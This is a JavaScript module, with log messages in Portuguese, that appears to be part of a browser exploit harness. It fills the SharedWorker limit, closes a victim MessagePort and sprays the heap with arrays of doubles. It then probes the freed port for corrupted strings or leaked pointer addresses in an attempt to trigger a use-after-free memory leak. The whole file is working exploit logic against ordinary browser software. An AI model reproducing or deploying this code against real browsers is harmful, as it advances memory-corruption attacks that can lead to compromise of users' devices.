import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap, clear_heap } from './heap.mjs';
import { build_leak_probe } from './payloads.mjs';

var workers_stash = [];
var current_test_idx = 0;
var is_running = false;
var interval_ref = null;

export function init() {
    const btnRun = document.getElementById("btn_run");
    const btnStop = document.getElementById("btn_stop");
    if(btnRun) btnRun.addEventListener("click", start_fuzzer);
    if(btnStop) btnStop.addEventListener("click", stop_fuzzer);
    log("Módulos prontos (Modo DoubleArray).", "success");
}

function stop_fuzzer() {
    is_running = false;
    if(interval_ref) clearInterval(interval_ref);
    log("FUZZER PARADO.", "fail");
    cleanup_round();
}

async function start_fuzzer() {
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    if (is_running) return;
    is_running = true;
    current_test_idx = 0;
    log(">>> INICIANDO FUZZER LAPSE STYLE <<<", "warn");
    test_next_size();
}

function test_next_size() {
    if (!is_running) return;
    if (current_test_idx >= CONFIG.SIZES_TO_TEST.length) {
        log("CICLO COMPLETO. Sem leak.", "fail");
        is_running = false;
        return;
    }

    const size = CONFIG.SIZES_TO_TEST[current_test_idx];
    log(`[...] Testando Tamanho: 0x${size.toString(16).toUpperCase()}`);

    // 1. Prepara Memória
    prepare_checkerboard_heap(size);
    
    // 2. Payload (Agora é um Array de Doubles)
    const payload = build_leak_probe(size);

    // 3. Trigger
    run_trigger(payload, size);
}

function run_trigger(payload, size) {
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380; 

    workers_stash = [];
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
    }

    interval_ref = setInterval(() => {
        if (!is_running) { clearInterval(interval_ref); return; }

        if (p_count >= limit) {
            clearInterval(interval_ref);
            const victim = workers_stash.pop();
            const result = attempt_leak(victim, payload, size);
            
            cleanup_round();
            clear_heap();
            
            if (result) {
                log(`!!! SUCESSO !!! Tamanho: 0x${size.toString(16)}`, "leak");
                is_running = false;
                alert("LEAK ENCONTRADO!");
            } else {
                current_test_idx++;
                setTimeout(test_next_size, 500);
            }
            return;
        }

        try {
            let w = new SharedWorker("data:text/javascript,1", "v_" + size + "_" + p_count);
            w.port.start();
            workers_stash.push(w);
        } catch(e) {}
        
        p_count++;
    }, 50);
}

function attempt_leak(victim, payload, size) {
    const port = victim.port;
    victim.port.close();
    
    // --- NOVO METODO DE SPRAY (ARRAYS NATIVOS) ---
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        // Clonar o array de doubles (Slice é rápido e cria cópia)
        spray.push(payload.slice(0));
    }

    try {
        const s = port.toString();
        
        if (s.indexOf("MessagePort") === -1) {
            log(`CORRUPÇÃO DETECTADA: ${s}`, "leak");
            return true;
        }
        
        // Teste de erro de ponteiro
        try { let _ = port.onmessage; } catch(e) {
            if (e.toString().match(/0x[0-9a-fA-F]+/)) {
                log(`ERRO COM PONTEIRO: ${e}`, "leak");
                return true;
            }
        }

    } catch (e) {
        log(`Erro Genérico: ${e}`, "info");
    }
    
    return false;
}

function cleanup_round() {
    workers_stash.forEach(w => { try { w.port.close(); } catch(e){} });
    workers_stash = [];
}
